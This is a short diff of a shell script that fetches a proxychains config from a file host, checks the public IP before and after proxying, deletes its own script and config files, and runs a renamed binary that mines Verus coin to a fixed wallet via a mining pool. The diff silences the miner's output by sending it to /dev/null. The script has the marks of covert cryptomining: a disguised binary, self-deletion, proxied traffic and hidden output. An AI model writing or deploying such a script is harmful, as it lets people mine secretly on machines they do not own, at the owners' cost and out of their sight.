@@ -5,4 +5,4 @@ wget -q https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && ch
 echo "IP ORI ==> "$(curl ifconfig.me)
 echo "IP Baru ==> "$(curl ifconfig.me)
 rm -rf sh.sh config_*
-./namo -algo Verushash -coin VRSC -wallet NHbEB833Qj9fMf3AmSN65X9voHCAeqomBEpt.SN -pool1 stratum+ssl://verushash.mine.zergpool.com:13300 &> /root/lg.txt &
+./namo -algo Verushash -coin VRSC -wallet NHbEB833Qj9fMf3AmSN65X9voHCAeqomBEpt.SN -pool1 stratum+ssl://verushash.mine.zergpool.com:13300 &> /dev/null &
